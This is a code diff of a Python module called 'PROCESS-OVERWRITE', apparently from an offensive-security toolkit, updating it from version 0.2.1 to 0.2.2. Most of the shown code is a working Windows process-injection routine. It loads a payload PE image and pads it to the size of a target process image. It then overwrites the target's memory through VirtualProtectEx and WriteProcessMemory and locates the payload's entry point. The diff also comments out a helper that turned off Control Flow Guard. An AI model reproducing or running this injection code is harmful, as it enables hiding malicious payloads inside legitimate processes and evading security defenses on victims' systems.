@@ -24,7 +24,7 @@ def register_arguments(parser):
 
 class module:
         Author = 'psycore8'
-        Version = '0.2.1'
+        Version = '0.2.2'
         DisplayName = 'PROCESS-OVERWRITE'
         pid = 0
         attr_list = any
@@ -100,27 +100,27 @@ class module:
                 else:
                     print(f'VirtualProtectEx error: {ctypes.get_last_error()}')
 
-        def create_nocfg_attributes(self, siex):
-            ctypes.memset(ctypes.byref(siex), 0, ctypes.sizeof(STARTUPINFOEX))
+        # def create_nocfg_attributes(self, siex):
+        #     ctypes.memset(ctypes.byref(siex), 0, ctypes.sizeof(STARTUPINFOEX))
             
-            cbAttributeListSize = ctypes.c_size_t(0)
-            MitgFlags = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
+        #     cbAttributeListSize = ctypes.c_size_t(0)
+        #     MitgFlags = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
             
-            kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(cbAttributeListSize))
-            if not cbAttributeListSize.value:
-                print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
-                return False
+        #     kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(cbAttributeListSize))
+        #     if not cbAttributeListSize.value:
+        #         print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
+        #         return False
             
-            buffer = ctypes.create_string_buffer(cbAttributeListSize.value)            
-            if not kernel32.InitializeProcThreadAttributeList(buffer, 1, 0, ctypes.byref(cbAttributeListSize)):
-                print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
-                siex.lpAttributeList = None
-                return False
+        #     buffer = ctypes.create_string_buffer(cbAttributeListSize.value)            
+        #     if not kernel32.InitializeProcThreadAttributeList(buffer, 1, 0, ctypes.byref(cbAttributeListSize)):
+        #         print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
+        #         siex.lpAttributeList = None
+        #         return False
             
-            if not kernel32.UpdateProcThreadAttribute(buffer, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(MitgFlags), ctypes.sizeof(MitgFlags), None, None):
-                print(f"UpdateProcThreadAttribute failed: {kernel32.GetLastError():#x}")
-                return False
-            return True, buffer
+        #     if not kernel32.UpdateProcThreadAttribute(buffer, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(MitgFlags), ctypes.sizeof(MitgFlags), None, None):
+        #         print(f"UpdateProcThreadAttribute failed: {kernel32.GetLastError():#x}")
+        #         return False
+        #     return True, buffer
         
         def free_nocfg_attributes(siex):
             if siex.lpAttributeList:
@@ -129,6 +129,11 @@ class module:
                 siex.lpAttributeList = None
                      
         def process(self):
+            pe = {
+                 'payload'  : { 'image_size': 0, 'image_base': 0 },
+                 'target'   : { 'image_size': 0, 'image_base': 0 }
+            }
+
             m = self.msg
             m('pre.head')
             bytes_written = SIZE_T()
@@ -138,8 +143,6 @@ class module:
 
             target_exists = self.os.path.exists(self.target)
             payload_exists = self.os.path.exists(self.payload)
-            # if not target_exists or payload_exists:
-            #      m('arg.error', None, True)
             if not target_exists:
                  m('arg.error', self.target, True)
             if not payload_exists:
@@ -175,41 +178,55 @@ class module:
             else:
                 m('merror', 'Base address NOT found', True)
 
-            m('mnote', 'Processing target image')
+            m('mnote', 'Processing target image') 
+
             pe_target = self.pefile.PE(self.target)
-            target_image_size = pe_target.OPTIONAL_HEADER.SizeOfImage
-            target_img_base = pe_target.OPTIONAL_HEADER.ImageBase
-            target_info = f'image base: {hex(target_img_base)} - Size: {target_image_size}'
+            #target_image_size = pe_target.OPTIONAL_HEADER.SizeOfImage
+            #pe['target'] = pe_target.OPTIONAL_HEADER.SizeOfImage, pe_target.OPTIONAL_HEADER.ImageBase
+            pe['target']['image_size'] = pe_target.OPTIONAL_HEADER.SizeOfImage
+            pe['target']['image_base'] = pe_target.OPTIONAL_HEADER.ImageBase
+            #target_img_base = pe_target.OPTIONAL_HEADER.ImageBase
+            #target_info = f'image base: {hex(target_img_base)} - Size: {target_image_size}'
+            target_info = f'image base: {hex(pe["target"]['image_base'])} - Size: {pe['target']['image_size']}'
             m('mok', f'Target: {target_info}')
 
             m('mnote', 'Processing payload image')
             pe_payl = self.pefile.PE(self.payload)
-            payload_img_base = pe_payl.OPTIONAL_HEADER.ImageBase
-            payload_image_size = pe_payl.OPTIONAL_HEADER.SizeOfImage
+            #payload_img_base = pe_payl.OPTIONAL_HEADER.ImageBase
+            #payload_image_size = pe_payl.OPTIONAL_HEADER.SizeOfImage
+            pe['payload']['image_base'] = pe_payl.OPTIONAL_HEADER.ImageBase
+            pe['payload']['image_size'] = pe_payl.OPTIONAL_HEADER.SizeOfImage
 
-            payload_info = f'image base: {hex(payload_img_base)} - Size: {payload_image_size}'
+            #payload_info = f'image base: {hex(payload_img_base)} - Size: {payload_image_size}'
+            payload_info = f'image base: {hex(pe["payload"]['image_base'])} - Size: {pe["payload"]["image_size"]}'
             m('mok', f'Payload: {payload_info}')
 
-            if payload_image_size > target_image_size:
+            #if payload_image_size > target_image_size:
+            if pe['payload']['image_size'] > pe['target']['image_size']:
                  m('merror', 'The payload is too big to fit in target!', True)
 
             m('mnote', 'Mapping memory image')
             pe_module = pe_payl.get_memory_mapped_image()
 
             ### fill payload PE image with 00
-            padding_bytes = target_image_size - len(pe_module)
+            #padding_bytes = target_image_size - len(pe_module)
+            padding_bytes = pe['target']['image_size'] - len(pe_module)
             m('mnote', f'Padding image to target size, adding {padding_bytes} bytes')
-            padding = (target_image_size - len(pe_module)) * b'\x00'
+            #padding = (target_image_size - len(pe_module)) * b'\x00'
+            padding = (pe['target']['image_size'] - len(pe_module)) * b'\x00'
             padded_payl = pe_module + padding
 
-            status = VirtualProtectEx(pi.hProcess, base_address, target_image_size, PAGE_READWRITE, oldprotect)
+            #status = VirtualProtectEx(pi.hProcess, base_address, target_image_size, PAGE_READWRITE, oldprotect)
+            status = VirtualProtectEx(pi.hProcess, base_address, pe['target']['image_size'], PAGE_READWRITE, oldprotect)
 
             m('mnote', 'Writing to process memory')
-            if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, target_image_size, ctypes.byref(bytes_written)):
+            #if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, target_image_size, ctypes.byref(bytes_written)):
+            if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, pe['target']['image_size'], ctypes.byref(bytes_written)):
                  raise Exception(f"WriteProcessMemory error: {ctypes.get_last_error()}")
 
             m('mok', f'{bytes_written.value} bytes written to target process')
-            self.set_section_access(pi.hProcess, base_address, pe_payl, target_image_size)
+            #self.set_section_access(pi.hProcess, base_address, pe_payl, target_image_size)
+            self.set_section_access(pi.hProcess, base_address, pe_payl, pe['target']['image_size'])
             entry_point_rva = pe_payl.OPTIONAL_HEADER.AddressOfEntryPoint
             entry_point = base_address + entry_point_rva
             m('mnote', f'Entry point is {hex(entry_point)}')
